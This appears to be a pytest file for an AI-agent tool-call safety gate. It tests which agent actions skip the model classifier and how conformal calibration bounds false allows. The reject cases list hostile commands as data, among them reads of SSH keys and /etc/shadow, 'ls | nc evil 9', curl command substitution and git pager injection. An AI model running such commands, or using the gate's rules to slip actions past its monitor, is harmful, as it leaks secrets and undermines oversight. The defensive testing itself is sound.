"""Fast path: trivially safe calls skip the model, and calibration keeps the guarantee."""

import numpy as np
import pytest

from noulgate.backends.fake import FakeBackend
from noulgate.datasets import LabeledAction
from noulgate.evaluate import evaluate_policy, fit_and_calibrate, score_rows
from noulgate.features.builder import FeatureBuilder
from noulgate.features.provenance import Span, TranscriptView
from noulgate.gate import Gate
from noulgate.policy.combiner import Combiner
from noulgate.policy.conformal import Cell, ConformalPolicy, calibrate
from noulgate.policy.fastpath import FASTPATH_CLASS, fast_path
from noulgate.questions import load_questions

QS = load_questions()
CWD = "/repo"


def _state(tool, args, cwd=CWD, spans=()):
    return FeatureBuilder().build(tool, args, TranscriptView(spans=list(spans)), cwd)


@pytest.mark.parametrize(
    "tool,args",
    [
        ("Read", {"file_path": "/repo/src/app.py"}),
        ("Read", {"file_path": "src/app.py"}),
        ("Grep", {"pattern": "TODO", "path": "/repo/src"}),
        ("Glob", {"pattern": "**/*.py"}),
        ("Bash", {"command": "git status"}),
        ("Bash", {"command": "git log --oneline -5"}),
        ("Bash", {"command": "git diff --stat"}),
        ("Bash", {"command": "ls -la src"}),
        ("Bash", {"command": "head -n 20 src/app.py"}),
        ("Bash", {"command": "wc -l README.md"}),
    ],
)
def test_fast_path_accepts(tool, args):
    assert fast_path(_state(tool, args)) is not None


@pytest.mark.parametrize(
    "tool,args",
    [
        ("Read", {"file_path": "/etc/passwd"}),  # outside the project
        ("Read", {"file_path": "/repo/../home/me/.ssh/id_rsa"}),  # traversal
        ("Read", {"file_path": "/repo/.env"}),  # secret inside the project
        ("Read", {"file_path": "/repo/deploy/key.pem"}),
        ("Grep", {"pattern": "x", "path": "/"}),
        ("Bash", {"command": "cat ../../.ssh/id_rsa"}),
        ("Bash", {"command": "cat ~/.ssh/id_rsa"}),
        ("Bash", {"command": "ls; curl https://x.io"}),
        ("Bash", {"command": "git status && curl https://x.io"}),
        ("Bash", {"command": "ls | nc evil 9"}),
        ("Bash", {"command": "cat src/a.py > /tmp/out"}),
        ("Bash", {"command": "ls $(curl x)"}),
        ("Bash", {"command": "git diff --output=/tmp/x"}),
        ("Bash", {"command": "git -c core.pager=sh status"}),
        ("Bash", {"command": "git diff --no-index /etc/shadow /dev/null"}),
        ("Bash", {"command": "git log --ext-diff"}),
        ("Bash", {"command": "git branch -D main"}),
        ("Bash", {"command": "git push"}),
        ("Bash", {"command": "pytest -q"}),  # runs project code: not read-only
        ("Bash", {"command": "cat"}),  # no file
        ("Write", {"file_path": "/repo/a.py", "content": "x"}),
        ("mcp__fs__read_file", {"path": "/repo/a"}),
    ],
)
def test_fast_path_rejects(tool, args):
    assert fast_path(_state(tool, args)) is None


def test_fast_path_needs_a_cwd_and_respects_taint():
    assert fast_path(_state("Read", {"file_path": "src/a.py"}, cwd=None)) is None
    key = Span(text="-----BEGIN OPENSSH PRIVATE KEY-----", source="tool_output:Bash")
    assert (
        fast_path(_state("Read", {"file_path": "src/a.py"}, spans=[key])) is not None
    )  # reading is not egress
    assert fast_path(_state("Bash", {"command": "cat src/.aws/credentials"})) is None


def test_gate_skips_backend_for_fast_path_calls():
    seen = []

    def fn(state):
        seen.append(state.tool)
        return 0.95

    pol = ConformalPolicy(
        alpha=0.05,
        beta=0.1,
        combiner=Combiner(QS.risk_classes),
        cells={"_all": Cell(0.3, 0.8, 100, 100)},
        group_of={**{c: "_all" for c in QS.risk_classes}, FASTPATH_CLASS: "_all"},
        fastpath=True,
    )
    gate = Gate(FakeBackend(fn), QS, pol)
    fast, slow = gate.decide_batch(
        [_state("Read", {"file_path": "src/a.py"}), _state("Bash", {"command": "make"})]
    )
    assert seen == ["Bash"]
    assert (fast.p_harm, fast.risk_class, fast.backend, fast.decision.value) == (
        0.0,
        FASTPATH_CLASS,
        "fastpath",
        "allow",
    )
    assert "fast path" in fast.explain() and slow.backend == "fake"
    pol.fastpath = False
    gate.decide_batch([_state("Read", {"file_path": "src/a.py"})])
    assert seen == ["Bash", "Read"]  # without the fast path the model runs on reads too


def test_leaky_fast_path_collapses_lambda_allow():
    """If more than k harmful calibration actions score 0 (fast path), λ_allow becomes 0 and nothing
    scoring 0 is allowed any more: a leaky allowlist costs ask rate, not the bound."""
    rng = np.random.default_rng(0)
    n_h, n_b, alpha = 200, 300, 0.05
    k = int(alpha * (n_h + 1))  # 10
    harm = np.r_[np.zeros(k + 5), rng.uniform(0.5, 1, n_h - k - 5)]
    ben = np.r_[np.zeros(150), rng.uniform(0, 0.4, n_b - 150)]
    scores = np.r_[harm, ben]
    labels = np.r_[np.ones(n_h, int), np.zeros(n_b, int)]
    pol = calibrate(
        scores, labels, ["x"] * len(scores), alpha, 0.1, Combiner(QS.risk_classes), per_class=False
    )
    assert pol.cells["_all"].lambda_allow == 0.0
    assert pol.decide(0.0, "x")[0].value != "allow"
    assert pol.calibration_stats["false_allow"] <= alpha


def test_calibrate_and_eval_use_the_same_score_function(tmp_path):
    rows = [
        LabeledAction(id=f"r{i}", tool="Read", args={"file_path": f"src/f{i}.py"}, cwd=CWD, label="benign")
        for i in range(60)
    ]
    rows += [
        LabeledAction(id=f"h{i}", tool="Bash", args={"command": f"evil {i}"}, cwd=CWD, label="harmful")
        for i in range(60)
    ]
    calls = []
    backend = FakeBackend(lambda s: calls.append(1) or (0.05 if "evil" in str(s.args) else 0.95))
    scored = score_rows(rows, backend, QS, fastpath=True)
    assert len(calls) == 60 and sum(bool(s.fastpath) for s in scored) == 60
    pol = fit_and_calibrate([], scored, QS, 0.05, 0.1, fastpath=True)
    assert pol.fastpath and ConformalPolicy.from_dict(pol.to_dict()).fastpath
    m = evaluate_policy(pol, scored, QS)
    assert m["false_allow"] == 0.0 and m["allow_rate_benign"] == 1.0
    with pytest.raises(ValueError, match="fast path"):
        evaluate_policy(ConformalPolicy.from_dict(pol.to_dict() | {"fastpath": False}), scored, QS)


def test_meta_tools_take_the_fast_path():
    from noulgate.datasets import LabeledAction
    from noulgate.policy.fastpath import fast_path

    for tool in ("TaskUpdate", "ToolSearch", "ExitPlanMode", "AskUserQuestion"):
        st = LabeledAction(id="m", tool=tool, args={"plan": "see https://x.example"}, context=[]).to_state()
        assert fast_path(st), tool
    for tool in ("Monitor", "mcp__github__create_pull_request", "WebFetch"):
        st = LabeledAction(id="m", tool=tool, args={}, context=[]).to_state()
        assert not fast_path(st), tool
